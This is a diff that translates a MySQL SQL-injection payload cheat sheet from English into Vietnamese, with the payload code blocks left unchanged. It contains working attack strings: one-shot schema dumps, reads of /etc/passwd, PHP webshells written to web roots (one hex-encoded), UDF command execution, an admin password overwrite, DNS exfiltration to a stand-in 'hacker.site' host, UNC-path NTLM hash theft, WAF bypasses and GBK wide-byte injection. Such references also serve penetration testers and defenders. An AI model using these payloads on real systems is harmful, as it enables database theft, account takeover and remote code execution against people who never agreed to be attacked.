 (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
@@ -464,20 +464,20 @@ DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an at
     (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
     ```
 
-## MYSQL Current Queries
+## Các truy vấn hiện tại trên MYSQL
 
-`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.
+`INFORMATION_SCHEMA.PROCESSLIST` là một bảng đặc biệt có sẵn trong MySQL và MariaDB, cung cấp thông tin về các tiến trình và luồng đang hoạt động trong máy chủ cơ sở dữ liệu. Bảng này có thể liệt kê tất cả các thao tác mà DB đang thực hiện tại thời điểm hiện tại.
 
-The `PROCESSLIST` table contains several important columns, each providing details about the current processes. Common columns include:
+Bảng `PROCESSLIST` chứa một số cột quan trọng, mỗi cột cung cấp thông tin chi tiết về các tiến trình hiện tại. Các cột phổ biến bao gồm:
 
-* **ID** : The process identifier.
-* **USER** : The MySQL user who is running the process.
-* **HOST** : The host from which the process was initiated.
-* **DB** : The database the process is currently accessing, if any.
-* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).
-* **TIME** : The time in seconds that the process has been running.
-* **STATE** : The current state of the process.
-* **INFO** : The text of the statement being executed, or NULL if no statement is being executed.
+* **ID**: Định danh của tiến trình.
+* **USER**: Người dùng MySQL đang chạy tiến trình.
+* **HOST**: Máy chủ khởi tạo tiến trình.
+* **DB**: Cơ sở dữ liệu mà tiến trình đang truy cập, nếu có.
+* **COMMAND**: Loại lệnh mà tiến trình đang thực thi (ví dụ: Query, Sleep).
+* **TIME**: Thời gian tính bằng giây mà tiến trình đã chạy.
+* **STATE**: Trạng thái hiện tại của tiến trình.
+* **INFO**: Nội dung câu lệnh đang được thực thi, hoặc NULL nếu không có câu lệnh nào đang được thực thi.
 
 ```sql
 SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
@@ -493,30 +493,30 @@ SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
 UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
 ```
 
-Dump in one shot query to extract the whole content of the table.
+Truy vấn trích xuất toàn bộ trong một lần để lấy hết nội dung của bảng.
 
 ```sql
 UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
 ```
 
-## MYSQL Read Content of a File
+## Đọc nội dung một tập tin trên MYSQL
 
-Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
+Cần có quyền `filepriv`, nếu không sẽ gặp lỗi: `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
 
 ```sql
 UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
 ```
 
-If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query
+Nếu bạn có quyền `root` trên cơ sở dữ liệu, bạn có thể kích hoạt lại `LOAD_FILE` bằng câu truy vấn sau
 
 ```sql
 GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 ```
 
-## MYSQL Command Execution
+## Thực thi lệnh trên MYSQL
 
-### WEBSHELL - OUTFILE Method
+### WEBSHELL - Phương pháp OUTFILE
 
 ```sql
 [...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
@@ -525,23 +525,23 @@ GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 [...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
 ```
 
-### WEBSHELL - DUMPFILE Method
+### WEBSHELL - Phương pháp DUMPFILE
 
 ```sql
 [...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
 [...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
 ```
 
-### COMMAND - UDF Library
+### LỆNH - Thư viện UDF
 
-First you need to check if the UDF are installed on the server.
+Trước tiên bạn cần kiểm tra xem UDF có được cài đặt trên máy chủ hay không.
 
 ```powershell
 $ whereis lib_mysqludf_sys.so
 /usr/lib/lib_mysqludf_sys.so
 ```
 
-Then you can use functions such as `sys_exec` and `sys_eval`.
+Sau đó bạn có thể dùng các hàm như `sys_exec` và `sys_eval`.
 
 ```sql
 $ mysql -u root -p mysql
@@ -557,27 +557,27 @@ mysql> SELECT sys_eval('id');
 
 ## MYSQL INSERT
 
-`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+Từ khóa `ON DUPLICATE KEY UPDATE` được dùng để báo cho MySQL biết phải làm gì khi ứng dụng cố gắng chèn một dòng đã tồn tại trong bảng. Ta có thể dùng điều này để thay đổi mật khẩu admin bằng cách:
 
-Inject using payload:
+Chèn bằng payload:
 
 ```sql
 attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
 ```
 
-The query would look like this:
+Câu truy vấn sẽ trông như sau:
 
 ```sql
 INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
 ```
 
-This query will insert a row for the user "`attacker_dummy@example.com`". It will also insert a row for the user "`admin@example.com`".
+Câu truy vấn này sẽ chèn một dòng cho người dùng "`attacker_dummy@example.com`". Nó cũng sẽ chèn một dòng cho người dùng "`admin@example.com`".
 
-Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to "P@ssw0rd". After this, we can simply authenticate with "`admin@example.com`" and the password "P@ssw0rd".
+Vì dòng này đã tồn tại, từ khóa `ON DUPLICATE KEY UPDATE` sẽ báo cho MySQL cập nhật cột `password` của dòng đã tồn tại đó thành "P@ssw0rd". Sau đó, ta có thể đơn giản là xác thực với "`admin@example.com`" và mật khẩu "P@ssw0rd".
 
-## MYSQL Truncation
+## Cắt xén dữ liệu trên MYSQL (Truncation)
 
-In MYSQL "`admin`" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+Trong MYSQL "`admin`" và "`admin `" (có khoảng trắng) được coi là giống nhau. Nếu cột username trong cơ sở dữ liệu có giới hạn số ký tự, phần ký tự còn lại sẽ bị cắt bớt. Vì vậy nếu cơ sở dữ liệu có giới hạn cột là 20 ký tự và ta nhập một chuỗi có 21 ký tự, ký tự cuối cùng sẽ bị loại bỏ.
 
 ```sql
 `username` varchar(20) not null
@@ -592,16 +592,16 @@ SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
 SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
 ```
 
-### DNS Exfiltration
+### Trích xuất dữ liệu qua DNS
 
 ```sql
 SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
 SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
 ```
 
-### UNC Path - NTLM Hash Stealing
+### Đường dẫn UNC - Đánh cắp hash NTLM
 
-The term "UNC path" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\server\share\file`.
+Thuật ngữ "đường dẫn UNC" đề cập đến đường dẫn theo Quy ước Đặt tên Chung (Universal Naming Convention) được dùng để xác định vị trí của các tài nguyên như tập tin chia sẻ hoặc thiết bị trên mạng. Nó thường được dùng trong môi trường Windows để truy cập tập tin qua mạng theo định dạng như `\\server\share\file`.
 
 ```sql
 SELECT LOAD_FILE('\\\\error\\abc');
@@ -611,13 +611,13 @@ SELECT '' INTO OUTFILE '\\\\error\\abc';
 LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
 ```
 
-:warning: Don't forget to escape the '\\\\'.
+:warning: Đừng quên escape dấu '\\\\'.
 
-## MYSQL WAF Bypass
+## Vượt qua WAF trên MYSQL
 
-### Alternative to Information Schema
+### Phương án thay thế cho Information Schema
 
-`information_schema.tables` alternative
+Phương án thay thế cho `information_schema.tables`
 
 ```sql
 SELECT * FROM mysql.innodb_table_stats;
@@ -638,7 +638,7 @@ mysql> SHOW TABLES IN dvwa;
 +----------------+
 ```
 
-### Alternative to VERSION
+### Phương án thay thế cho VERSION
 
 ```sql
 mysql> SELECT @@innodb_version;
@@ -670,61 +670,61 @@ mysql> SELECT @@GLOBAL.VERSION;
 +------------------+
 ```
 
-### Alternative to GROUP_CONCAT
+### Phương án thay thế cho GROUP_CONCAT
 
-Requirement: `MySQL >= 5.7.22`
+Yêu cầu: `MySQL >= 5.7.22`
 
-Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
+Dùng `json_arrayagg()` thay cho `group_concat()`, cho phép hiển thị nhiều ký tự hơn
 
-* `group_concat()` = 1024 symbols
-* `json_arrayagg()` > 16,000,000 symbols
+* `group_concat()` = 1024 ký tự
+* `json_arrayagg()` > 16.000.000 ký tự
 
 ```sql
 SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
 ```
 
-### Scientific Notation
+### Ký hiệu khoa học (Scientific Notation)
 
-In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
-The format is: `base 'e' exponent`.
+Trong MySQL, ký hiệu e được dùng để biểu diễn số theo ký hiệu khoa học. Đây là cách thể hiện các số rất lớn hoặc rất nhỏ theo định dạng ngắn gọn. Ký hiệu e bao gồm một số theo sau bởi chữ e và một số mũ.
+Định dạng là: `cơ số 'e' số mũ`.
 
-For example:
+Ví dụ:
 
-* `1e3` represents `1 x 10^3` which is `1000`.
-* `1.5e3` represents `1.5 x 10^3` which is `1500`.
-* `2e-3` represents `2 x 10^-3` which is `0.002`.
+* `1e3` đại diện cho `1 x 10^3` tức là `1000`.
+* `1.5e3` đại diện cho `1.5 x 10^3` tức là `1500`.
+* `2e-3` đại diện cho `2 x 10^-3` tức là `0.002`.
 
-The following queries are equivalent:
+Các câu truy vấn sau đây là tương đương nhau:
 
 * `SELECT table_name FROM information_schema 1.e.tables`
 * `SELECT table_name FROM information_schema .tables`
 
-In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.
-This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`
+Tương tự, payload phổ biến để vượt qua xác thực `' or ''='` tương đương với `' or 1.e('')='` và `1' or 1.e(1) or '1'='1`.
+Kỹ thuật này có thể được dùng để làm rối câu truy vấn nhằm vượt qua WAF, ví dụ: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`
 
-### Conditional Comments
+### Chú thích có điều kiện
 
-MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.
-The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored.
+Chú thích có điều kiện trong MySQL được đặt trong `/*! ... */` và có thể bao gồm một số phiên bản để chỉ định phiên bản MySQL tối thiểu cần thiết để thực thi đoạn mã bên trong.
+Mã bên trong chú thích này chỉ được thực thi nếu phiên bản MySQL lớn hơn hoặc bằng số ngay sau `/*!`. Nếu phiên bản MySQL nhỏ hơn số được chỉ định, mã bên trong chú thích sẽ bị bỏ qua.
 
-* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
-* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.
+* `/*!12345UNION*/`: Điều này có nghĩa là từ UNION sẽ được thực thi như một phần của câu lệnh SQL nếu phiên bản MySQL là 12.345 trở lên.
+* `/*!31337SELECT*/`: Tương tự, từ SELECT sẽ được thực thi nếu phiên bản MySQL là 31.337 trở lên.
 
-**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`
+**Ví dụ**: `/*!12345UNION*/`, `/*!31337SELECT*/`
 
-### Wide Byte Injection (GBK)
+### Chèn ký tự đa byte (GBK)
 
-Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.
+Chèn ký tự đa byte (Wide byte injection) là một loại tấn công SQL injection cụ thể nhắm vào các ứng dụng sử dụng bộ ký tự đa byte, như GBK hoặc SJIS. Thuật ngữ "wide byte" đề cập đến các bảng mã ký tự trong đó một ký tự có thể được biểu diễn bởi nhiều hơn một byte. Loại chèn này đặc biệt quan trọng khi ứng dụng và cơ sở dữ liệu diễn giải các chuỗi đa byte khác nhau.
 
-The `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.
+Câu truy vấn `SET NAMES gbk` có thể bị khai thác trong một cuộc tấn công SQL injection dựa trên bảng mã. Khi bộ ký tự được đặt thành GBK, một số ký tự đa byte nhất định có thể được dùng để vượt qua cơ chế escape và chèn mã SQL độc hại.
 
-Several characters can be used to trigger the injection.
+Một số ký tự có thể được dùng để kích hoạt việc chèn injection.
 
-* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.
-* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.
-* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).
+* `%bf%27`: Đây là biểu diễn URL-encoded của chuỗi byte `0xbf27`. Trong bộ ký tự GBK, `0xbf27` được giải mã thành một ký tự đa byte hợp lệ theo sau bởi một dấu nháy đơn ('). Khi MySQL gặp chuỗi này, nó sẽ diễn giải thành một ký tự GBK hợp lệ duy nhất theo sau bởi một dấu nháy đơn, từ đó kết thúc chuỗi.
+* `%bf%5c`: Đại diện cho chuỗi byte `0xbf5c`. Trong GBK, chuỗi này được giải mã thành một ký tự đa byte hợp lệ theo sau bởi một dấu gạch chéo ngược (`\`). Điều này có thể được dùng để escape ký tự tiếp theo trong chuỗi.
+* `%a1%27`: Đại diện cho chuỗi byte `0xa127`. Trong GBK, chuỗi này được giải mã thành một ký tự đa byte hợp lệ theo sau bởi một dấu nháy đơn (`'`).
 
-A lot of payloads can be created such as:
+Rất nhiều payload có thể được tạo ra như:
 
 ```sql
 %A8%27 OR 1=1;--
@@ -732,7 +732,7 @@ A lot of payloads can be created such as:
 %bf' OR 1=1 -- --
 ```
 
-Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.
+Đây là một ví dụ PHP sử dụng bảng mã GBK và lọc dữ liệu đầu vào của người dùng để escape dấu gạch chéo ngược, dấu nháy đơn và dấu nháy kép.
 
 ```php
 function check_addslashes($string)
@@ -750,17 +750,17 @@ $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 print_r(mysql_error());
 ```
 
-Here's a breakdown of how the wide byte injection works:
+Dưới đây là cách kỹ thuật chèn ký tự đa byte hoạt động:
 
-For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.
+Ví dụ, nếu dữ liệu đầu vào là `?id=1'`, PHP sẽ thêm một dấu gạch chéo ngược, tạo ra câu truy vấn SQL: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.
 
-However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.
+Tuy nhiên, khi chuỗi `%df` được đưa vào trước dấu nháy đơn, như trong `?id=1%df'`, PHP vẫn thêm dấu gạch chéo ngược. Điều này tạo ra câu truy vấn SQL: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.
 
-In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape character, allowing for SQL injection.
+Trong bộ ký tự GBK, chuỗi `%df%5c` được dịch thành ký tự `連`. Vì vậy, câu truy vấn SQL trở thành: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Ở đây, ký tự đa byte `連` đã "ăn" mất ký tự escape được thêm vào, cho phép thực hiện SQL injection.
 
-Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.
+Do đó, bằng cách sử dụng payload `?id=1%df' and 1=1 --+`, sau khi PHP thêm dấu gạch chéo ngược, câu truy vấn SQL sẽ chuyển thành: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. Câu truy vấn đã bị thay đổi này có thể được chèn thành công, vượt qua logic SQL dự kiến ban đầu.
 
-## References
+## Tài liệu tham khảo
 
 * [[SQLi] Extracting data without knowing columns names - Ahmed Sultan - February 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
 * [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - October 19, 2021](https://web.archive.org/web/20211019152624/https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
